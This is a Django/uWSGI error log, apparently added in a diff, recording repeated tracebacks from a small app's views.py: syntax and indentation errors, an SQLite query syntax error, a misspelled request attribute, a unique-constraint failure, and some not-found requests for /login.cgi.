+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 602, in url_patterns
+    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
+  File "/usr/local/lib64/python3.6/site-packages/django/utils/functional.py", line 48, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 595, in urlconf_module
+    return import_module(self.urlconf_name)
+  File "/usr/lib64/python3.6/importlib/__init__.py", line 126, in import_module
+    return _bootstrap._gcd_import(name[level:], package, level)
+  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
+  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
+  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
+  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
+  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
+  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
+  File "/root/liekiewaa/web/jobordera/appa/urls.py", line 19, in <module>
+    import appa.views as views
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 45
+    l=cursor.execute(sql)
+    ^
+SyntaxError: invalid syntax
+2022-03-15 05:53:08,540 [uWSGIWorker1Core0:139965649279168] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /use/
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 167, in _get_response
+    callback, callback_args, callback_kwargs = self.resolve_request(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 290, in resolve_request
+    resolver_match = resolver.resolve(request.path_info)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 560, in resolve
+    for pattern in self.url_patterns:
+  File "/usr/local/lib64/python3.6/site-packages/django/utils/functional.py", line 48, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 602, in url_patterns
+    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
+  File "/usr/local/lib64/python3.6/site-packages/django/utils/functional.py", line 48, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 595, in urlconf_module
+    return import_module(self.urlconf_name)
+  File "/usr/lib64/python3.6/importlib/__init__.py", line 126, in import_module
+    return _bootstrap._gcd_import(name[level:], package, level)
+  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
+  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
+  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
+  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
+  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
+  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
+  File "/root/liekiewaa/web/jobordera/appa/urls.py", line 19, in <module>
+    import appa.views as views
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 46
+    l=cursor.execute(sql)
+    ^
+SyntaxError: invalid syntax
+2022-03-15 05:55:49,428 [uWSGIWorker1Core0:140008234281152] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /use/
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 82, in _execute
+    return self.cursor.execute(sql)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/sqlite3/base.py", line 421, in execute
+    return Database.Cursor.execute(self, query)
+sqlite3.OperationalError: near "WHERE": syntax error
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 181, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 93, in use
+    data = serch(btime,etime)
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 48, in serch
+    l=cursor.execute(sql)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 98, in execute
+    return super().execute(sql, params)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 66, in execute
+    return self._execute_with_wrappers(sql, params, many=False, executor=self._execute)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 75, in _execute_with_wrappers
+    return executor(sql, params, many, context)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 84, in _execute
+    return self.cursor.execute(sql, params)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/utils.py", line 90, in __exit__
+    raise dj_exc_value.with_traceback(traceback) from exc_value
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 82, in _execute
+    return self.cursor.execute(sql)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/sqlite3/base.py", line 421, in execute
+    return Database.Cursor.execute(self, query)
+django.db.utils.OperationalError: near "WHERE": syntax error
+2022-03-15 05:57:27,894 [uWSGIWorker1Core0:140418361764032] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-15 06:20:22,202 [uWSGIWorker1Core0:140045723809984] [django.request:230] [log:log_response] [WARNING]- Not Found: /favicon.ico
+2022-03-15 07:08:44,771 [uWSGIWorker1Core0:140596347361472] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-15 08:05:10,043 [uWSGIWorker1Core0:140596347361472] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-15 08:14:46,023 [uWSGIWorker1Core0:140596347361472] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-15 08:49:57,200 [uWSGIWorker1Core0:139919830767808] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /login.cgi
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 167, in _get_response
+    callback, callback_args, callback_kwargs = self.resolve_request(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 290, in resolve_request
+    resolver_match = resolver.resolve(request.path_info)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 590, in resolve
+    raise Resolver404({'path': path})
+django.urls.exceptions.Resolver404: {'path': 'login.cgi'}
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/utils/deprecation.py", line 117, in __call__
+    response = response or self.get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 49, in inner
+    response = response_for_exception(request, exc)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 57, in response_for_exception
+    response = debug.technical_404_response(request, exc)
+  File "/usr/local/lib64/python3.6/site-packages/django/views/debug.py", line 520, in technical_404_response
+    resolver_match = resolve(request.path)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/base.py", line 24, in resolve
+    return get_resolver(urlconf).resolve(path)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 560, in resolve
+    for pattern in self.url_patterns:
+  File "/usr/local/lib64/python3.6/site-packages/django/utils/functional.py", line 48, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 602, in url_patterns
+    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
+  File "/usr/local/lib64/python3.6/site-packages/django/utils/functional.py", line 48, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 595, in urlconf_module
+    return import_module(self.urlconf_name)
+  File "/usr/lib64/python3.6/importlib/__init__.py", line 126, in import_module
+    return _bootstrap._gcd_import(name[level:], package, level)
+  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
+  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
+  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
+  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
+  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
+  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
+  File "/root/liekiewaa/web/jobordera/appa/urls.py", line 19, in <module>
+    import appa.views as views
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 71
+    set_cookietest(a)
+                    ^
+IndentationError: unindent does not match any outer indentation level
+2022-03-15 08:51:06,891 [uWSGIWorker1Core0:139726875461824] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /admin/
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 167, in _get_response
+    callback, callback_args, callback_kwargs = self.resolve_request(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 290, in resolve_request
+    resolver_match = resolver.resolve(request.path_info)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 560, in resolve
+    for pattern in self.url_patterns:
+  File "/usr/local/lib64/python3.6/site-packages/django/utils/functional.py", line 48, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 602, in url_patterns
+    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
+  File "/usr/local/lib64/python3.6/site-packages/django/utils/functional.py", line 48, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 595, in urlconf_module
+    return import_module(self.urlconf_name)
+  File "/usr/lib64/python3.6/importlib/__init__.py", line 126, in import_module
+    return _bootstrap._gcd_import(name[level:], package, level)
+  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
+  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
+  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
+  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
+  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
+  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
+  File "/root/liekiewaa/web/jobordera/appa/urls.py", line 19, in <module>
+    import appa.views as views
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 71
+    set_cookietest(a)
+                    ^
+IndentationError: unindent does not match any outer indentation level
+2022-03-15 08:51:14,854 [uWSGIWorker1Core0:139726875461824] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /admin/
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 167, in _get_response
+    callback, callback_args, callback_kwargs = self.resolve_request(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 290, in resolve_request
+    resolver_match = resolver.resolve(request.path_info)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 560, in resolve
+    for pattern in self.url_patterns:
+  File "/usr/local/lib64/python3.6/site-packages/django/utils/functional.py", line 48, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 602, in url_patterns
+    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
+  File "/usr/local/lib64/python3.6/site-packages/django/utils/functional.py", line 48, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 595, in urlconf_module
+    return import_module(self.urlconf_name)
+  File "/usr/lib64/python3.6/importlib/__init__.py", line 126, in import_module
+    return _bootstrap._gcd_import(name[level:], package, level)
+  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
+  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
+  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
+  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
+  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
+  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
+  File "/root/liekiewaa/web/jobordera/appa/urls.py", line 19, in <module>
+    import appa.views as views
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 71
+    set_cookietest(a)
+                    ^
+IndentationError: unindent does not match any outer indentation level
+2022-03-15 08:51:23,444 [uWSGIWorker1Core0:139726875461824] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 167, in _get_response
+    callback, callback_args, callback_kwargs = self.resolve_request(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 290, in resolve_request
+    resolver_match = resolver.resolve(request.path_info)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 560, in resolve
+    for pattern in self.url_patterns:
+  File "/usr/local/lib64/python3.6/site-packages/django/utils/functional.py", line 48, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 602, in url_patterns
+    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
+  File "/usr/local/lib64/python3.6/site-packages/django/utils/functional.py", line 48, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 595, in urlconf_module
+    return import_module(self.urlconf_name)
+  File "/usr/lib64/python3.6/importlib/__init__.py", line 126, in import_module
+    return _bootstrap._gcd_import(name[level:], package, level)
+  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
+  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
+  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
+  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
+  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
+  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
+  File "/root/liekiewaa/web/jobordera/appa/urls.py", line 19, in <module>
+    import appa.views as views
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 71
+    set_cookietest(a)
+                    ^
+IndentationError: unindent does not match any outer indentation level
+2022-03-15 08:52:12,429 [uWSGIWorker1Core0:139726875461824] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 167, in _get_response
+    callback, callback_args, callback_kwargs = self.resolve_request(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 290, in resolve_request
+    resolver_match = resolver.resolve(request.path_info)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 560, in resolve
+    for pattern in self.url_patterns:
+  File "/usr/local/lib64/python3.6/site-packages/django/utils/functional.py", line 48, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 602, in url_patterns
+    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
+  File "/usr/local/lib64/python3.6/site-packages/django/utils/functional.py", line 48, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 595, in urlconf_module
+    return import_module(self.urlconf_name)
+  File "/usr/lib64/python3.6/importlib/__init__.py", line 126, in import_module
+    return _bootstrap._gcd_import(name[level:], package, level)
+  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
+  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
+  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
+  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
+  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
+  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
+  File "/root/liekiewaa/web/jobordera/appa/urls.py", line 19, in <module>
+    import appa.views as views
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 71
+    set_cookietest(a)
+                    ^
+IndentationError: unindent does not match any outer indentation level
+2022-03-15 08:53:20,513 [uWSGIWorker1Core0:140267832023232] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 167, in _get_response
+    callback, callback_args, callback_kwargs = self.resolve_request(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 290, in resolve_request
+    resolver_match = resolver.resolve(request.path_info)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 560, in resolve
+    for pattern in self.url_patterns:
+  File "/usr/local/lib64/python3.6/site-packages/django/utils/functional.py", line 48, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 602, in url_patterns
+    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
+  File "/usr/local/lib64/python3.6/site-packages/django/utils/functional.py", line 48, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 595, in urlconf_module
+    return import_module(self.urlconf_name)
+  File "/usr/lib64/python3.6/importlib/__init__.py", line 126, in import_module
+    return _bootstrap._gcd_import(name[level:], package, level)
+  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
+  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
+  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
+  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
+  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
+  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
+  File "/root/liekiewaa/web/jobordera/appa/urls.py", line 19, in <module>
+    import appa.views as views
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 71
+    set_cookietest(a)
+                    ^
+IndentationError: unindent does not match any outer indentation level
+2022-03-15 08:53:23,916 [uWSGIWorker1Core0:140267832023232] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /admin/
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 167, in _get_response
+    callback, callback_args, callback_kwargs = self.resolve_request(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 290, in resolve_request
+    resolver_match = resolver.resolve(request.path_info)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 560, in resolve
+    for pattern in self.url_patterns:
+  File "/usr/local/lib64/python3.6/site-packages/django/utils/functional.py", line 48, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 602, in url_patterns
+    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
+  File "/usr/local/lib64/python3.6/site-packages/django/utils/functional.py", line 48, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 595, in urlconf_module
+    return import_module(self.urlconf_name)
+  File "/usr/lib64/python3.6/importlib/__init__.py", line 126, in import_module
+    return _bootstrap._gcd_import(name[level:], package, level)
+  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
+  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
+  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
+  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
+  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
+  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
+  File "/root/liekiewaa/web/jobordera/appa/urls.py", line 19, in <module>
+    import appa.views as views
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 71
+    set_cookietest(a)
+                    ^
+IndentationError: unindent does not match any outer indentation level
+2022-03-15 08:53:28,553 [uWSGIWorker1Core0:140267832023232] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 167, in _get_response
+    callback, callback_args, callback_kwargs = self.resolve_request(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 290, in resolve_request
+    resolver_match = resolver.resolve(request.path_info)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 560, in resolve
+    for pattern in self.url_patterns:
+  File "/usr/local/lib64/python3.6/site-packages/django/utils/functional.py", line 48, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 602, in url_patterns
+    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
+  File "/usr/local/lib64/python3.6/site-packages/django/utils/functional.py", line 48, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 595, in urlconf_module
+    return import_module(self.urlconf_name)
+  File "/usr/lib64/python3.6/importlib/__init__.py", line 126, in import_module
+    return _bootstrap._gcd_import(name[level:], package, level)
+  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
+  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
+  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
+  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
+  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
+  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
+  File "/root/liekiewaa/web/jobordera/appa/urls.py", line 19, in <module>
+    import appa.views as views
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 71
+    set_cookietest(a)
+                    ^
+IndentationError: unindent does not match any outer indentation level
+2022-03-15 08:53:51,080 [uWSGIWorker1Core0:139940234868928] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 167, in _get_response
+    callback, callback_args, callback_kwargs = self.resolve_request(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 290, in resolve_request
+    resolver_match = resolver.resolve(request.path_info)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 560, in resolve
+    for pattern in self.url_patterns:
+  File "/usr/local/lib64/python3.6/site-packages/django/utils/functional.py", line 48, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 602, in url_patterns
+    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
+  File "/usr/local/lib64/python3.6/site-packages/django/utils/functional.py", line 48, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 595, in urlconf_module
+    return import_module(self.urlconf_name)
+  File "/usr/lib64/python3.6/importlib/__init__.py", line 126, in import_module
+    return _bootstrap._gcd_import(name[level:], package, level)
+  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
+  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
+  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
+  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
+  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
+  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
+  File "/root/liekiewaa/web/jobordera/appa/urls.py", line 19, in <module>
+    import appa.views as views
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 71
+    set_cookietest(a)
+                    ^
+IndentationError: unindent does not match any outer indentation level
+2022-03-15 08:54:10,728 [uWSGIWorker1Core0:139703226325184] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 167, in _get_response
+    callback, callback_args, callback_kwargs = self.resolve_request(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 290, in resolve_request
+    resolver_match = resolver.resolve(request.path_info)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 560, in resolve
+    for pattern in self.url_patterns:
+  File "/usr/local/lib64/python3.6/site-packages/django/utils/functional.py", line 48, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 602, in url_patterns
+    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
+  File "/usr/local/lib64/python3.6/site-packages/django/utils/functional.py", line 48, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 595, in urlconf_module
+    return import_module(self.urlconf_name)
+  File "/usr/lib64/python3.6/importlib/__init__.py", line 126, in import_module
+    return _bootstrap._gcd_import(name[level:], package, level)
+  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
+  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
+  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
+  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
+  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
+  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
+  File "/root/liekiewaa/web/jobordera/appa/urls.py", line 19, in <module>
+    import appa.views as views
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 71
+    set_cookietest(a)
+                    ^
+IndentationError: unindent does not match any outer indentation level
+2022-03-15 08:54:34,842 [uWSGIWorker1Core0:140043787602112] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /admin/
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 181, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 78, in admin
+    status = request.COOIES.get("name")
+AttributeError: 'WSGIRequest' object has no attribute 'COOIES'
+2022-03-15 09:04:56,128 [uWSGIWorker1Core0:139907253844160] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /admin/
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 84, in _execute
+    return self.cursor.execute(sql, params)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/sqlite3/base.py", line 423, in execute
+    return Database.Cursor.execute(self, query, params)
+sqlite3.IntegrityError: UNIQUE constraint failed: appa_userinfo.username
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 181, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 92, in admin
+    data = adminadd(username, usercode, usertype)
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 37, in adminadd
+    userinfo.objects.create(userid=k+1,username=ausername, password=busercode, type=cusertype)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/models/manager.py", line 85, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/models/query.py", line 453, in create
+    obj.save(force_insert=True, using=self.db)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/models/base.py", line 740, in save
+    force_update=force_update, update_fields=update_fields)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/models/base.py", line 778, in save_base
+    force_update, using, update_fields,
+  File "/usr/local/lib64/python3.6/site-packages/django/db/models/base.py", line 881, in _save_table
+    results = self._do_insert(cls._base_manager, using, fields, returning_fields, raw)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/models/base.py", line 921, in _do_insert
+    using=using, raw=raw,
+  File "/usr/local/lib64/python3.6/site-packages/django/db/models/manager.py", line 85, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/models/query.py", line 1270, in _insert
+    return query.get_compiler(using=using).execute_sql(returning_fields)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/models/sql/compiler.py", line 1416, in execute_sql
+    cursor.execute(sql, params)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 98, in execute
+    return super().execute(sql, params)
